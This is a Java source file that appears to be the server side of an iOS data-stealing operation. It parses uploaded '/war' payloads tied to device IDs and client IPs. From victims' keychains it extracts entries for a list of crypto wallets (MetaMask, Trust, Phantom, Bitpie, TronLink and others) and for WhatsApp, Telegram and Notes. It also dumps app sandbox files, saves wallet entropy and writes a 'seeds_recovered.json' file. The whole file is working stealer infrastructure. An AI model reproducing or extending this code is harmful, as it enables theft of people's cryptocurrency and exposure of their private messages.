package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.consumer.entity.Ios18ParamEntity;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.Base64;

/**
 * /war 解压落盘：files/hex + files/sandbox + 轻量 meta.json。
 * 外层路径由调用方决定（通常为 bin 旁的 {@code <basename>_unpacked}）。
 */
final class WarDocLayoutWriter {

    private static final char[] HEX = "0123456789abcdef".toCharArray();

    private static final Set<String> HEX_ALLOW = new LinkedHashSet<>(Arrays.asList(
            "bitpie", "exodus", "phantom", "uniswap", "trust", "tonhub", "coin98", "mytonwallet",
            "imtoken", "metamask", "bitget", "tonkeeper", "solflare", "tronlink", "okx", "tokenpocket",
            "notes", "whatsapp", "telegram", "wallet"
    ));

    private WarDocLayoutWriter() {}

    /**
     * 原落盘约定：与 .bin 同目录，文件夹名为 {@code <binBasename>_unpacked}。
     * 例：{@code .../20260823/war/UUID_sha16_size.bin} → {@code .../UUID_sha16_size_unpacked/}
     */
    static File resolveEntryDirBesideBin(File bin) {
        String name = bin.getName();
        if (name.toLowerCase(Locale.ROOT).endsWith(".bin")) {
            name = name.substring(0, name.length() - 4);
        }
        File parent = bin.getParentFile();
        if (parent == null) {
            return new File(name + "_unpacked");
        }
        return new File(parent, name + "_unpacked");
    }

    /**
     * @return extracted file count
     */
    static int extractAndWrite(JSONObject payloadWar, File unpackDir, Map<String, Integer> walletHits)
            throws IOException {
        File hexDir = new File(unpackDir, "files/hex");
        File sandboxDir = new File(unpackDir, "files/sandbox");
        Files.createDirectories(hexDir.toPath());
        Files.createDirectories(sandboxDir.toPath());
        int n = 0;
        n += extractKeychain(payloadWar, hexDir, walletHits);
        n += extractSandbox(payloadWar, sandboxDir);
        return n;
    }

    /**
     * 仅写 parse/运维可选的轻量 meta；不写 这是什么/summary/SecItem 等说明文件。
     * payload.json 也不再落盘（parse_ci 读原始 .bin + files/）。
     */
    static void writeSidecars(File unpackDir, Ios18ParamEntity entity, File bin,
                              JSONObject payloadWar, int extractedFiles, String deviceUuid,
                              Map<String, Integer> walletHits) throws IOException {
        Path root = unpackDir.toPath();
        Files.createDirectories(root);

        String clientIp = entity.getClientIp() == null ? "" : entity.getClientIp();
        LocalDateTime now = LocalDateTime.ofInstant(Instant.now(), ZoneOffset.ofHours(8));
        long seq = entity.getSeq() != null ? entity.getSeq() : (entity.getId() == null ? 0 : entity.getId());
        int rawBytes = entity.getBodyBytes() != null ? entity.getBodyBytes() : (int) Math.min(bin.length(), Integer.MAX_VALUE);

        JSONObject meta = new JSONObject(true);
        meta.put("endpoint", "/war");
        meta.put("device", deviceUuid);
        meta.put("client", clientIp);
        meta.put("saved_at", now.format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss")));
        meta.put("raw_bytes", rawBytes);
        meta.put("seq", seq);
        meta.put("ios18param_id", entity.getId());
        meta.put("extracted_files", extractedFiles);
        if (walletHits != null && !walletHits.isEmpty()) {
            meta.put("wallet_hits", walletHits);
        }
        Files.write(root.resolve("meta.json"), meta.toJSONString().getBytes(StandardCharsets.UTF_8));

        JSONObject kc = payloadWar == null ? null : payloadWar.getJSONObject("keychain");
        Object seeds = payloadWar == null ? null : payloadWar.get("seeds");
        if (seeds == null && kc != null) seeds = kc.get("seeds");
        if (seeds != null) {
            writeText(root.resolve("seeds_recovered.json"),
                    seeds instanceof String ? (String) seeds : JSON.toJSONString(seeds));
        }
    }

    private static int extractKeychain(JSONObject payloadWar, File hexDir, Map<String, Integer> walletHits) {
        int count = 0;
        JSONObject keychain = payloadWar.getJSONObject("keychain");
        if (keychain == null) return 0;
        JSONObject tables = keychain.getJSONObject("tables");
        if (tables == null) return 0;
        Map<String, Integer> nameSeq = new HashMap<>();

        for (String tableName : tables.keySet()) {
            JSONObject table = tables.getJSONObject(tableName);
            if (table == null) continue;
            JSONArray items = table.getJSONArray("items");
            if (items == null) continue;
            for (int i = 0; i < items.size(); i++) {
                JSONObject item = items.getJSONObject(i);
                if (item == null) continue;
                String service = nz(item.getString("service"));
                String account = nz(item.getString("account"));
                String accessGroup = nz(item.getString("accessGroup"));
                String app = mapApp(service, account, accessGroup);
                if (app == null) continue;

                Object dataHexObj = item.get("dataHex");
                byte[] decoded = decodeData(dataHexObj);
                if (decoded == null || decoded.length == 0) continue;

                File appDir = new File(hexDir, app);
                try {
                    Files.createDirectories(appDir.toPath());
                } catch (IOException e) {
                    continue;
                }

                String label = !account.isEmpty() ? account : (!service.isEmpty() ? service : "item");
                String stemBase = sanitize(label);
                if (stemBase.isEmpty()) stemBase = "item";
                String stem = stemBase + "_data";
                byte[] fileContent = decoded;
                String ext = guessExt(decoded);

                // bitpie 熵：存 hex 文本
                if ("bitpie".equals(app) && account.toLowerCase(Locale.ROOT).contains("entropy")
                        && !account.toLowerCase(Locale.ROOT).contains("written")
                        && !account.toLowerCase(Locale.ROOT).contains("language")) {
                    String hexText = (dataHexObj instanceof String && ((String) dataHexObj).matches("[0-9a-fA-F]+"))
                            ? (String) dataHexObj : toHex(decoded);
                    fileContent = hexText.getBytes(StandardCharsets.UTF_8);
                    ext = ".txt";
                }

                String uniqueStem = nextStem(appDir, stem, ext, nameSeq);
                List<String> savedAs = new ArrayList<>();
                try {
                    Path withExt = appDir.toPath().resolve(uniqueStem + ext);
                    Files.write(withExt, fileContent);
                    savedAs.add("hex/" + app + "/" + uniqueStem + ext);
                    count++;
                    if (".txt".equals(ext)) {
                        Path bare = appDir.toPath().resolve(uniqueStem);
                        Files.write(bare, fileContent);
                        savedAs.add(0, "hex/" + app + "/" + uniqueStem);
                    }
                } catch (IOException e) {
                    continue;
                }

                walletHits.merge(app, 1, Integer::sum);
                JSONObject stub = new JSONObject(true);
                stub.put("saved_as", savedAs);
                stub.put("app", app);
                stub.put("decoded_bytes", decoded.length);
                stub.put("preview_utf8", previewUtf8(decoded));
                item.put("dataHex", stub);
            }
        }
        return count;
    }

    private static int extractSandbox(JSONObject payloadWar, File sandboxDir) {
        int count = 0;
        JSONObject sandbox = payloadWar.getJSONObject("sandbox");
        if (sandbox == null) return 0;
        for (String appName : new ArrayList<>(sandbox.keySet())) {
            JSONObject appData = sandbox.getJSONObject(appName);
            if (appData == null) continue;
            String appSafe = sanitize(appName);
            File appDir = new File(sandboxDir, appSafe);
            try {
                Files.createDirectories(appDir.toPath());
            } catch (IOException e) {
                continue;
            }
            for (String relPath : new ArrayList<>(appData.keySet())) {
                Object val = appData.get(relPath);
                if (!(val instanceof String)) continue;
                byte[] fileBytes;
                try {
                    fileBytes = Base64.getDecoder().decode((String) val);
                } catch (Exception e) {
                    fileBytes = ((String) val).getBytes(StandardCharsets.UTF_8);
                }
                String safeRel = sanitizeRel(relPath);
                if (safeRel == null) continue;
                File outFile = new File(appDir, safeRel);
                try {
                    Files.createDirectories(Objects.requireNonNull(outFile.getParentFile()).toPath());
                    Files.write(outFile.toPath(), fileBytes);
                    if (!safeRel.endsWith(".json") && looksJson(fileBytes)) {
                        Files.write(Paths.get(outFile.getAbsolutePath() + ".json"), fileBytes);
                    }
                    count++;
                } catch (IOException e) {
                    continue;
                }
                JSONObject stub = new JSONObject(true);
                stub.put("saved_as", Collections.singletonList(
                        "sandbox/" + appSafe + "/" + safeRel.replace('\\', '/')));
                stub.put("decoded_bytes", fileBytes.length);
                appData.put(relPath, stub);
            }
        }
        return count;
    }

    static String mapApp(String service, String account, String accessGroup) {
        String combined = (nz(service) + " " + nz(account) + " " + nz(accessGroup)).toLowerCase(Locale.ROOT);
        String decoded = tryHexUtf8(account);
        String ex = combined + " " + (decoded == null ? "" : decoded.toLowerCase(Locale.ROOT));

        String app = null;
        if (ex.contains("bitpie")) app = "bitpie";
        else if (ex.contains("uniswap")) app = "uniswap";
        else if (ex.contains("phantom")) app = "phantom";
        else if (ex.contains("exodus")) app = "exodus";
        else if (ex.contains("sixdays.trust") || ex.contains("trustwallet") || ex.contains("trustwallet")
                || (ex.contains("trust") && !ex.contains("trustpilot"))) app = "trust";
        else if (ex.contains("tonhub")) app = "tonhub";
        else if (ex.contains("coin98")) app = "coin98";
        else if (ex.contains("mytonwallet")) app = "mytonwallet";
        else if (ex.contains("im.token") || ex.contains("imtoken")) app = "imtoken";
        else if (ex.contains("metamask") || ex.contains("io.metamask")) app = "metamask";
        else if (ex.contains("tokenpocket") || ex.contains("global.wallet")
                || "global.udid".equalsIgnoreCase(nz(account))) app = "tokenpocket";
        else if (ex.contains("bitkeep") || ex.contains("bitget")) app = "bitget";
        else if (ex.contains("tonkeeper") || ex.contains("jbig.tonkeeper")) app = "tonkeeper";
        else if (ex.contains("solflare")) app = "solflare";
        else if (ex.contains("tronlink")) app = "tronlink";
        else if (ex.contains("okex") || ex.contains("okx") || "okg".equalsIgnoreCase(nz(service)))
            app = "okx";
        else if (ex.contains("whatsapp")) app = "whatsapp";
        else if (ex.contains("telegram")) app = "telegram";
        else if (ex.contains("notes") || ex.contains("notestore") || ex.contains("com.apple.notes")) app = "notes";

        if (app == null || !HEX_ALLOW.contains(app)) return null;
        return app;
    }

    private static String nextStem(File appDir, String stem, String ext, Map<String, Integer> nameSeq) {
        String key = appDir.getAbsolutePath() + "|" + stem;
        int n = nameSeq.getOrDefault(key, 0);
        nameSeq.put(key, n + 1);
        if (n == 0) {
            if (!new File(appDir, stem + ext).exists() && !new File(appDir, stem).exists()) return stem;
            n = 1;
            nameSeq.put(key, 2);
        }
        return stem + "_" + n;
    }

    private static String guessExt(byte[] data) {
        if (data == null || data.length == 0) return ".bin";
        String t = new String(data, StandardCharsets.UTF_8).trim();
        if (t.startsWith("{") || t.startsWith("[")) return ".json";
        if (t.startsWith("bplist") || t.startsWith("<?xml") || t.contains("<plist")) return ".plist";
        int lim = Math.min(data.length, 512);
        int printable = 0;
        for (int i = 0; i < lim; i++) {
            int b = data[i] & 0xff;
            if (b == 9 || b == 10 || b == 13 || (b >= 32 && b < 127)) printable++;
        }
        if (printable * 10 >= lim * 8) return ".txt";
        return ".bin";
    }

    private static String previewUtf8(byte[] data) {
        if (data == null || data.length == 0) return null;
        String s = new String(data, StandardCharsets.UTF_8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\uFFFD' || (c < 0x09) || (c > 0x0d && c < 0x20)) return null;
        }
        return s.length() > 4000 ? s.substring(0, 4000) : s;
    }

    private static byte[] decodeData(Object dataHex) {
        if (dataHex == null) return null;
        if (dataHex instanceof String) {
            String hex = (String) dataHex;
            if (hex.matches("[0-9a-fA-F]+") && hex.length() % 2 == 0) {
                try { return hexToBytes(hex); } catch (Exception ignore) {}
            }
            try { return Base64.getDecoder().decode(hex); } catch (Exception ignore) {}
            return hex.getBytes(StandardCharsets.UTF_8);
        }
        if (dataHex instanceof JSONObject) {
            JSONObject obj = (JSONObject) dataHex;
            if (obj.containsKey("saved_as")) return null;
            Object inner = obj.get("dataHex");
            if (inner != null) return decodeData(inner);
        }
        return null;
    }

    private static String tryHexUtf8(String s) {
        if (s == null || s.isEmpty()) return null;
        String t = s.trim();
        if (t.length() % 2 != 0 || !t.matches("[0-9a-fA-F]+")) return null;
        try {
            byte[] b = hexToBytes(t);
            String d = new String(b, StandardCharsets.UTF_8);
            int p = 0;
            for (char c : d.toCharArray()) if (c >= 0x20 && c < 0x7f) p++;
            return p * 2 >= d.length() ? d : null;
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private static String toHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            int v = b & 0xff;
            sb.append(HEX[v >>> 4]).append(HEX[v & 0x0f]);
        }
        return sb.toString();
    }

    private static String sanitize(String name) {
        if (name == null || name.isEmpty()) return "unnamed";
        return name.replaceAll("[^a-zA-Z0-9_\\-\\.\\@]", "_");
    }

    private static String sanitizeRel(String path) {
        if (path == null || path.isEmpty()) return null;
        String[] parts = path.replace('\\', '/').split("/");
        StringBuilder sb = new StringBuilder();
        for (String part : parts) {
            if (part == null || part.isEmpty() || ".".equals(part) || "..".equals(part)) continue;
            if (sb.length() > 0) sb.append('/');
            sb.append(part.replaceAll("[^a-zA-Z0-9_\\-\\.]", "_"));
        }
        return sb.length() > 0 ? sb.toString() : null;
    }

    private static boolean looksJson(byte[] data) {
        if (data == null || data.length < 2) return false;
        String t = new String(data, 0, Math.min(64, data.length), StandardCharsets.UTF_8).trim();
        return t.startsWith("{") || t.startsWith("[");
    }

    private static void writeText(Path path, String text) throws IOException {
        Files.write(path, (text == null ? "" : text).getBytes(StandardCharsets.UTF_8));
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
